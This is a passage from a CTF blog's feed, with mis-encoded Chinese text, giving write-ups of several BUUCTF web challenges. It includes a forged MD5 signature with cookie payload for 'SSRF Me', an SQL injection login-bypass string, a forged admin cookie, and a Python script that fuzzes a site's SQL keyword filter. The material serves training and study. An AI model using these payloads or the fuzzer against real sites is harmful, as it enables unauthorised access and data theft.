æ–¹æ³•ç”¨äºæ£€æŸ¥å­—ç¬¦ä¸²æ˜¯å¦æ˜¯ä»¥æŒ‡å®šå­å­—ç¬¦ä¸²å¼€å¤´ï¼Œå¦‚æœæ˜¯åˆ™è¿”å› Trueï¼Œå¦åˆ™è¿”å› Falseã€‚å¦‚æœå‚æ•° beg å’Œ end æŒ‡å®šå€¼ï¼Œåˆ™åœ¨æŒ‡å®šèŒƒå›´å†…æ£€æŸ¥ï¼š</h5><p>å‚è€ƒ:<a href="https://www.runoob.com/python/att-string-startswith.html">Python startswith()æ–¹æ³• | èœé¸Ÿæ•™ç¨‹ (runoob.com)</a></p><p><img src="/images/2023-8-29-SSRFMe/image-20230829131547193.png" alt="image-20230829131547193"></p><p><img src="/images/2023-8-29-SSRFMe/image-20230829131601809.png" alt="image-20230829131601809"></p><h5 id="urllib-urlopen-path"><a href="#urllib-urlopen-path" class="headerlink" title="urllib.urlopen(path):"></a>urllib.urlopen(path):</h5><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">from</span> urllib.request <span class="hljs-keyword">import</span> urlopen<br><br>myURL = urlopen(<span class="hljs-string">&quot;https://www.runoob.com/&quot;</span>)<br><span class="hljs-built_in">print</span>(myURL.read())<br></code></pre></td></tr></table></figure><p>è§£é‡Š:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs txt">ä»¥ä¸Šä»£ç ä½¿ç”¨ urlopen æ‰“å¼€ä¸€ä¸ª URLï¼Œç„¶åä½¿ç”¨ read() å‡½æ•°è·å–ç½‘é¡µçš„ HTML å®ä½“ä»£ç ã€‚<br><br>read() æ˜¯è¯»å–æ•´ä¸ªç½‘é¡µå†…å®¹ï¼Œæˆ‘ä»¬å¯ä»¥æŒ‡å®šè¯»å–çš„é•¿åº¦<br>å¦‚è¯»å–é•¿åº¦ä¸º300ï¼šread(300)<br></code></pre></td></tr></table></figure><h5 id="REMOTE-ADDR"><a href="#REMOTE-ADDR" class="headerlink" title="REMOTE_ADDR:"></a>REMOTE_ADDR:</h5><p>å‚è€ƒ:<a href="https://www.cnblogs.com/luxiaojun/p/10451860.html">HTTP è¯·æ±‚å¤´ä¸­çš„ Remote_Addrï¼ŒX-Forwarded-Forï¼ŒX-Real-IP - 23äº‘æ‹49æ« - åšå®¢å›­ (cnblogs.com)</a></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">è¡¨ç¤ºå‘å‡ºè¯·æ±‚çš„è¿œç¨‹ä¸»æœºçš„ IP åœ°å€ï¼Œremote_addrä»£è¡¨å®¢æˆ·ç«¯çš„IPï¼Œä½†å®ƒçš„å€¼ä¸æ˜¯ç”±å®¢æˆ·ç«¯æä¾›çš„ï¼Œè€Œæ˜¯æœåŠ¡ç«¯æ ¹æ®å®¢æˆ·ç«¯çš„ipæŒ‡å®šçš„ï¼Œå½“ä½ çš„æµè§ˆå™¨è®¿é—®æŸä¸ªç½‘ç«™æ—¶ï¼Œå‡è®¾ä¸­é—´æ²¡æœ‰ä»»ä½•ä»£ç†ï¼Œé‚£ä¹ˆç½‘ç«™çš„webæœåŠ¡å™¨ï¼ˆNginxï¼ŒApacheç­‰ï¼‰å°±ä¼šæŠŠremote_addrè®¾ä¸ºä½ çš„æœºå™¨IPï¼Œå¦‚æœä½ ç”¨äº†æŸä¸ªä»£ç†ï¼Œé‚£ä¹ˆä½ çš„æµè§ˆå™¨ä¼šå…ˆè®¿é—®è¿™ä¸ªä»£ç†ï¼Œç„¶åå†ç”±è¿™ä¸ªä»£ç†è½¬å‘åˆ°ç½‘ç«™ï¼Œè¿™æ ·webæœåŠ¡å™¨å°±ä¼šæŠŠremote_addrè®¾ä¸ºè¿™å°ä»£ç†æœºå™¨çš„IP<br></code></pre></td></tr></table></figure><h5 id="x-forwarded-forï¼š"><a href="#x-forwarded-forï¼š" class="headerlink" title="x_forwarded_forï¼š"></a>x_forwarded_forï¼š</h5><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">ç®€ç§°XFFå¤´ï¼Œå®ƒä»£è¡¨å®¢æˆ·ç«¯ï¼Œä¹Ÿå°±æ˜¯HTTPçš„è¯·æ±‚ç«¯çœŸå®çš„IPï¼Œåªæœ‰åœ¨é€šè¿‡äº†HTTP ä»£ç†æˆ–è€…è´Ÿè½½å‡è¡¡æœåŠ¡å™¨æ—¶æ‰ä¼šæ·»åŠ è¯¥é¡¹ï¼Œæ­£å¦‚ä¸Šé¢æ‰€è¿°,å½“ä½ ä½¿ç”¨äº†ä»£ç†æ—¶,webæœåŠ¡å™¨å°±ä¸çŸ¥é“ä½ çš„çœŸå®IPäº†,ä¸ºäº†é¿å…è¿™ä¸ªæƒ…å†µ,ä»£ç†æœåŠ¡å™¨é€šå¸¸ä¼šå¢åŠ ä¸€ä¸ªå«åšx_forwarded_forçš„å¤´ä¿¡æ¯,æŠŠè¿æ¥å®ƒçš„å®¢æˆ·ç«¯IP(å³ä½ çš„ä¸Šç½‘æœºå™¨IP)åŠ åˆ°è¿™ä¸ªå¤´ä¿¡æ¯é‡Œ,è¿™æ ·å°±èƒ½ä¿è¯ç½‘ç«™çš„webæœåŠ¡å™¨èƒ½è·å–åˆ°çœŸå®IP<br></code></pre></td></tr></table></figure><h5 id="os-path-exists"><a href="#os-path-exists" class="headerlink" title="os.path.exists():"></a>os.path.exists():</h5><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">oså³operating systemï¼ˆæ“ä½œç³»ç»Ÿï¼‰ï¼ŒPython çš„ os æ¨¡å—å°è£…äº†å¸¸è§çš„æ–‡ä»¶å’Œç›®å½•æ“ä½œã€‚os.pathæ¨¡å—ä¸»è¦ç”¨äºæ–‡ä»¶çš„å±æ€§è·å–,existsæ˜¯â€œå­˜åœ¨â€çš„æ„æ€ï¼Œæ‰€ä»¥é¡¾åæ€ä¹‰ï¼Œos.path.exists()å°±æ˜¯åˆ¤æ–­æ‹¬å·é‡Œçš„æ–‡ä»¶æ˜¯å¦å­˜åœ¨çš„æ„æ€ï¼Œæ‹¬å·å†…çš„å¯ä»¥æ˜¯æ–‡ä»¶è·¯å¾„<br>åŸæ–‡é“¾æ¥ï¼šhttps://blog.csdn.net/u012424313/article/details/82216092<br></code></pre></td></tr></table></figure><p>4.åˆ†æ:<br>(1).æœ‰ä»£ç åˆ†æå¾—è®¿é—®url&#x2F;geneSignåªä¼šè¿”å›md5(secert_key + param + action)çš„ç»“æœï¼Œè®¿é—®url&#x2F;åªä¼šè¿”å›code.txtæ–‡ä»¶çš„å†…å®¹ï¼Œæ‰€ä»¥æˆ‘ä»¬åªèƒ½å»è®¿é—®url&#x2F;De1ta:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">http://25f82c99-8160-4244-bc6c-fee7c6ef602e.node4.buuoj.cn:81/De1ta<br></code></pre></td></tr></table></figure><p>å¯¹è·¯ç”±å™¨@app.route(â€˜&#x2F;De1taâ€™, methods&#x3D;[â€˜GETâ€™, â€˜POSTâ€™])ä¸‹çš„å‡½æ•°è¿›è¡Œåˆ†æåå¾—:</p><p>æˆ‘ä»¬éœ€è¦ä»¤param&#x3D;flag.txt,åŒæ—¶actionä¸­å¿…é¡»æœ‰scan,è¿™æ ·å°±å¯ä»¥è°ƒç”¨</p><p>scan(param)ï¼Œå»è®¿é—®å½“å‰ç½‘é¡µä¸‹çš„æ–‡ä»¶flag.txt(å¦‚æœç›´æ¥è®¿é—®æ˜¯è®¿é—®ä¸åˆ°çš„ï¼Œå¯èƒ½æ˜¯flaskæ¡†æ¶çš„ä½œç”¨)</p><p><img src="/images/2023-8-29-SSRFMe/image-20230829140947972.png" alt="image-20230829140947972"></p><p>(2).ä½†æ˜¯å¦‚æœåªæœ‰scanæ˜¯æ— æ³•å¯¹æ–‡ä»¶å†…å®¹è¿›è¡Œæ˜¾ç¤ºçš„ï¼Œåªæœ‰actionä¸­åŒ…å«æœ‰readæ—¶ï¼Œæ‰èƒ½è¿›è¡Œæ˜¾ç¤ºæ–‡ä»¶å†…å®¹:</p><p><img src="/images/2023-8-29-SSRFMe/image-20230829141123757.png" alt="image-20230829141123757"></p><p>readå¯ä»¥å°†å†™å…¥flag.txtçš„å†…å®¹çš„æ–‡ä»¶result.txtå†æ¬¡è¿›è¡Œè¯»å–ï¼Œå¹¶å­˜å¦‚æœ€ç»ˆéœ€è¦æ˜¾ç¤ºçš„resultå­—å…¸ä¸­:</p><p><img src="/images/2023-8-29-SSRFMe/image-20230829141312146.png" alt="image-20230829141312146"></p><p>æ‰€ä»¥action&#x3D;scanread</p><p>(3).è¦è§¦å‘ä¸Šè¿°å†…å®¹éœ€è¦ç»•è¿‡checkSign()çš„æ£€æµ‹:<br><strong>md5(secert_key + param + action)&#x3D;sign</strong></p><p><img src="/images/2023-8-29-SSRFMe/image-20230829141406740.png" alt="image-20230829141406740"></p><p>5.æœ€ç»ˆpayloadçš„æ„é€ :</p><p>(1).<strong>secert_key:</strong><br><img src="/images/2023-8-29-SSRFMe/image-20230829142324834.png" alt="image-20230829142324834"></p><p><strong>ç”±äºflaskæ¡†æ¶ä¸­ï¼Œç½‘é¡µæ˜¾ç¤ºï¼ˆæ‰§è¡Œï¼‰çš„éƒ½æ˜¯è·¯ç”±å™¨çš„å†…å®¹ï¼Œæ‰€ä»¥å¯¹äºç½‘é¡µæ¥è¯´ï¼Œåœ¨è·¯ç”±å™¨ä¹‹å‰æ‰€å®šä¹‰çš„secert_keyåœ¨ç½‘é¡µæ˜¾ç¤ºåéƒ½æ˜¯å”¯ä¸€çš„ï¼Œå³åœ¨ç½‘é¡µåˆå§‹åŒ–çš„æ—¶å€™å¯¹secert_keyèµ‹å€¼ï¼Œä¹‹åè¯¥å…¨å±€å˜é‡éƒ½æ˜¯ä¸å˜çš„</strong></p><p>(2).å‚æ•°çš„åŸºæœ¬æƒ…å†µ:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs txt">param=flag.txt<br>action=scanread<br>secert_key=xxx<br>sign=md5(xxxflag.txtscanread)<br></code></pre></td></tr></table></figure><p>ç°åœ¨å°±æ˜¯è¦è·å–md5(xxxflag.txtscanread)çš„å€¼</p><p>(3)url&#x2F;geneSignçš„åˆ©ç”¨:</p><p><img src="/images/2023-8-29-SSRFMe/image-20230829142858868.png" alt="image-20230829142858868"></p><p>è¯¥è·¯ç”±å™¨ä¼šè¿”å›:md5(secert_key+param+scan)çš„å€¼</p><p>æ‰€ä»¥å¦‚æœæˆ‘ä»¬ä»¤param&#x3D;flag.txtread</p><p>åˆ™è¯¥è·¯ç”±å™¨è¿”å›çš„å°±æ˜¯md5(xxxflag.txtreadscan)</p><p>å°±å¯ä»¥æ´»å¾—signçš„å€¼ï¼š<br>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">param=flag.txtread<br></code></pre></td></tr></table></figure><p>è¾“å‡º:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">5927506259f0daa2cdfb35867203b343<br></code></pre></td></tr></table></figure><p>æ‰€ä»¥æ­¤æ—¶sign&#x3D;5927506259f0daa2cdfb35867203b343&#x3D;xxxflag.txtreadscan</p><p>(3).æœ€ç»ˆçš„payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs txt">url/De1ta<br>?param=flag.txt<br><br>Cookie:action=readscan;sign=5927506259f0daa2cdfb35867203b343<br></code></pre></td></tr></table></figure><p><img src="/images/2023-8-29-SSRFMe/image-20230829143838356.png" alt="image-20230829143838356"></p><p>flag&#x3D;flag{ceb51b96-bdcf-415a-bb56-da305f851028}</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>BUUCTF_WEB_[BSidesCF 2019]Futurella &amp; [BSidesCF 2019]Kookie é¢˜è§£</title>
    <link href="/2023/08/29/2023-08-29-Futurella&amp;Kookie/"/>
    <url>/2023/08/29/2023-08-29-Futurella&amp;Kookie/</url>
    
    <content type="html"><![CDATA[<h2 id="BSidesCF-2019-Futurella-BSidesCF-2019-Kookie-é¢˜è§£"><a href="#BSidesCF-2019-Futurella-BSidesCF-2019-Kookie-é¢˜è§£" class="headerlink" title="[BSidesCF 2019]Futurella &amp; [BSidesCF 2019]Kookie é¢˜è§£"></a>[BSidesCF 2019]Futurella &amp; [BSidesCF 2019]Kookie é¢˜è§£</h2><h3 id="BSidesCF-2019-Futurellaï¼š"><a href="#BSidesCF-2019-Futurellaï¼š" class="headerlink" title="[BSidesCF 2019]Futurellaï¼š"></a>[BSidesCF 2019]Futurellaï¼š</h3><p>1.æ‰“å¼€ç½‘é¡µ:</p><p><img src="/images/2023-8-29-Futurella-Kookie/image-20230829102315243.png" alt="image-20230829102315243"></p><p>2.æŸ¥çœ‹ç½‘é¡µæºä»£ç ï¼Œctrl+få¯»æ‰¾flagï¼š<br><img src="/images/2023-8-29-Futurella-Kookie/image-20230829102410491.png" alt="image-20230829102410491"></p><p>flag&#x3D;flag{bbc0ff54-a162-4d27-a1db-2e02a3bb9208}</p><h3 id="BSidesCF-2019-Kookie"><a href="#BSidesCF-2019-Kookie" class="headerlink" title="[BSidesCF 2019]Kookie:"></a>[BSidesCF 2019]Kookie:</h3><p>1.æ‰“å¼€ç½‘é¡µ:<br><img src="/images/2023-8-29-Futurella-Kookie/image-20230829100927708.png" alt="image-20230829100927708"></p><p>å‘ç°éœ€è¦è¿›è¡Œç™»å½•ï¼Œç„¶åç™»å½•æ—¶è¦ä¸ºadmin</p><p>2.æŸ¥çœ‹ç½‘é¡µæºä»£ç ï¼Œæ²¡æœ‰å‘ç°æœ‰ç”¨ä¿¡æ¯ï¼Œé‚£ä¹ˆæˆ‘ä»¬ä½¿ç”¨ä¸‡èƒ½å¯†ç è¯•è¯•:<br>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">username=admin<br>password=1&#x27;or&#x27;1&#x27;=&#x27;1&#x27;;#<br></code></pre></td></tr></table></figure><p><img src="/images/2023-8-29-Futurella-Kookie/image-20230829101139704.png" alt="image-20230829101139704"></p><p>å‘ç°ä¸è¡Œ</p><p>æŸ¥çœ‹æ˜¯å¦å­˜åœ¨sqlæ³¨å…¥:</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">username=admin<br>password=1&#x27;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-8-29-Futurella-Kookie/image-20230829101226407.png" alt="image-20230829101226407"></p><p>å‘ç°æ²¡æœ‰sqlæŠ¥é”™</p><p><strong>3.ä½¿ç”¨ä¸‰å¤§ç›²æ³¨ï¼Œä½†æ˜¯ç›²æ³¨æ˜¯å›æ˜¾1æˆ–0çš„ç•Œé¢ï¼Œç”±äºpasswordä¸æ˜¯0æˆ–1æ‰€ä»¥æ— è®ºæ€ä¹ˆæ ·éƒ½å›æ˜¾çš„æ˜¯é”™è¯¯ç•Œé¢</strong></p><p>4.æœ‰é¢˜ç›®æç¤ºå¾—ï¼Œè¿™é¢˜å’Œcookieæœ‰å…³ï¼Œæˆ‘ä»¬ç”¨BPå¯¹å…¶è¿›è¡ŒæŠ“åŒ…:</p><p><img src="/images/2023-8-29-Futurella-Kookie/image-20230829101755577.png" alt="image-20230829101755577"></p><p>æˆ‘ä»¬çŒœæµ‹å¯èƒ½è¦ä¿®æ”¹cookieçš„å€¼ï¼Œä½†æ˜¯åœ¨headersä¸­æ²¡æœ‰å‘ç°cookieå­—æ®µ</p><p>åˆæ ¹æ®é¢˜ç›®æç¤ºï¼šwe found the account cookie,çŒœæµ‹ä»–ä»¬å¯èƒ½æ˜¯ä»cookieä¸­åˆ¤æ–­å½“å‰ç”¨æˆ·çš„ç™»å½•è´¦æˆ·æ˜¯è°</p><p>æ„é€ payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">Cookie:username=admin<br></code></pre></td></tr></table></figure><p><img src="/images/2023-8-29-Futurella-Kookie/image-20230829102106154.png" alt="image-20230829102106154"></p><p>å‘ç°äº†flag</p><p>flag&#x3D;flag{98c976cd-ae86-46c5-b83e-8d86080798b9}</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>BUUCTF_WEB_[CISCN2019 ååŒ—èµ›åŒº Day2 Web1]Hack World é¢˜è§£</title>
    <link href="/2023/08/28/2023-08-28-%5BCISCN2019%20%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA%20Day2%20Web1%5DHack%20World/"/>
    <url>/2023/08/28/2023-08-28-%5BCISCN2019%20%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA%20Day2%20Web1%5DHack%20World/</url>
    
    <content type="html"><![CDATA[<h2 id="CISCN2019-ååŒ—èµ›åŒº-Day2-Web1-Hack-World"><a href="#CISCN2019-ååŒ—èµ›åŒº-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 ååŒ—èµ›åŒº Day2 Web1]Hack World"></a>[CISCN2019 ååŒ—èµ›åŒº Day2 Web1]Hack World</h2><p>1.æ‰“å¼€ç½‘é¡µ:</p><p><img src="/images/2023-8-28-HackWorld/image-20230828141042210.png" alt="image-20230828141042210"></p><p>å‘ç°æœ‰ä¸€ä¸ªæ³¨å…¥ç‚¹ï¼Œå°è¯•å¯¹å…¶è¿›è¡Œæ³¨å…¥ï¼Œç”±é¢˜ç›®æç¤ºå¾—ï¼Œflagåœ¨æ•°æ®åº“ä¸­ï¼Œæ‰€ä»¥è¯¥æ³¨å…¥ç‚¹åº”è¯¥ä¸ºsqlæ³¨å…¥:</p><p>ä½¿ç”¨BPæµ‹è¯•è¯¥ç½‘ç«™å±äºä»€ä¹ˆè¯·æ±‚:</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">1<br></code></pre></td></tr></table></figure><p><img src="/images/2023-8-28-HackWorld/image-20230828141849022.png" alt="image-20230828141849022"></p><p>ä½¿ç”¨è„šæœ¬åˆ¤æ–­è¯¥ç½‘ç«™è¿‡æ»¤äº†å“ªäº›å†…å®¹:</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><span class="hljs-comment"># æ‰“å¼€è¯»å–SQL_fuzzæ–‡ä»¶</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;SQL_fuzz.txt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    contents = f.readlines()<br>    <span class="hljs-comment"># print(contents)</span><br><span class="hljs-comment"># åˆ é™¤è¯»å–æ•°æ®ä¸­çš„&#x27;\n&#x27;</span><br>data_list = []<br><span class="hljs-keyword">for</span> msg <span class="hljs-keyword">in</span> contents:<br>    msg = msg.strip(<span class="hljs-string">&#x27;\n&#x27;</span>)<br>    <span class="hljs-comment"># # å­—ç¬¦ä¸²æ ¹æ®ç©ºæ ¼è¿›è¡Œåˆ†å‰²</span><br>    <span class="hljs-comment"># d = msg.split(&#x27; &#x27;)</span><br>    data_list.append(msg)<br>f.close<br><span class="hljs-comment"># print(data_list)</span><br><br><span class="hljs-comment"># è¿›è¡Œfuzzæ³¨å…¥</span><br>url = <span class="hljs-string">&quot;http://cbdddd87-2da0-4863-a3fa-3afcff406fb8.node4.buuoj.cn:81/index.php&quot;</span><br><span class="hljs-comment"># GETè¯·æ±‚</span><br><span class="hljs-comment"># for data in data_list:</span><br><span class="hljs-comment">#     da = data</span><br><span class="hljs-comment">#     da = &quot;1 &#123;&#125;&quot;.format(data)</span><br><span class="hljs-comment">#     da = &quot;1&#123;&#125;&quot;.format(data)</span><br><span class="hljs-comment">#     r = requests.get(url+da)</span><br><span class="hljs-comment">#     # ä½¿ç”¨timeä½¿è¯·æ±‚èƒ½å¤Ÿæ‹¥æœ‰è¶³å¤Ÿçš„æ—¶é—´å»å“åº”</span><br><span class="hljs-comment">#     time.sleep(0.04)</span><br><span class="hljs-comment">#     # è·å–è¿‡æ»¤ç½‘ç«™å“åº”ä¿¡æ¯</span><br><span class="hljs-comment">#     reponse_txt = &quot;è‡­å¼Ÿå¼Ÿ&quot;</span><br><span class="hljs-comment">#     if (reponse_txt in r.text):</span><br><span class="hljs-comment">#         print(&quot;è¯¥ç½‘ç«™è¿‡æ»¤äº†&#123;&#125;&quot;.format(data))</span><br><br><span class="hljs-comment"># POSTè¯·æ±‚</span><br><span class="hljs-keyword">for</span> d <span class="hljs-keyword">in</span> data_list:<br>    <span class="hljs-comment"># da = d</span><br>    <span class="hljs-comment"># da = &quot;1 &#123;&#125;&quot;.format(d)</span><br>    da = <span class="hljs-string">&quot;1&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(d)<br>    payload = &#123;<br>        <span class="hljs-string">&quot;id&quot;</span>: da<br>    &#125;<br>    r = requests.post(url=url, data=payload)<br>    time.sleep(<span class="hljs-number">0.04</span>)<br>    reponse_txt = <span class="hljs-string">&quot;SQL&quot;</span><br>    <span class="hljs-keyword">if</span> (reponse_txt <span class="hljs-keyword">in</span> r.text):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;è¯¥ç½‘ç«™è¿‡æ»¤äº†&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(d))<br></code></pre></td></tr></table></figure><p>è¾“å‡º:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs txt">è¯¥ç½‘ç«™è¿‡æ»¤äº†length Length<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†+<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†handler<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†selectSeleCT <br>è¯¥ç½‘ç«™è¿‡æ»¤äº†delete<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†oroR<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†-~<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†limitLimIt<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†insertinsERTINSERT<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†#<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†--+<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†INFORMATION<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†--<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†;<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†+<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†xor<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†ANDANd<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†&quot;<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†length <br>è¯¥ç½‘ç«™è¿‡æ»¤äº†+<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†unionUNIonUNION<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†&quot;<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†&amp;<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†&amp;&amp;<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†||<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†oorr<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†//*<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†*/*<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†/**/<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†anandd<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†GROUP<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†INTO<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†OR<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†ORDER<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†ORD<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†UNION<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†UPDATE<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†AND<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†delete<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†GROUP_CONCAT<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†group_concat<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†DELETE<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†floor<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†rand()<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†information_schema.tables<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†LIMIT<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†ORD<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†order <br>è¯¥ç½‘ç«™è¿‡æ»¤äº†ORDER<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†OUTFILE<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†updatexml<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†format<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†ord<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†UPDATE<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†/*<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†`<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†  <br>è¯¥ç½‘ç«™è¿‡æ»¤äº†for<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†BEFORE<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†sys schemma<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†SEPARATOR<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†XOR<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†CURSOR<br>è¯¥ç½‘ç«™è¿‡æ»¤äº†FLOOR<br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">1<br></code></pre></td></tr></table></figure><p><img src="/images/2023-8-28-HackWorld/image-20230828141224893.png" alt="image-20230828141224893"></p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">1&#x27;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-8-28-HackWorld/image-20230828141251957.png" alt="image-20230828141251957"></p><p>payload:</p><figure 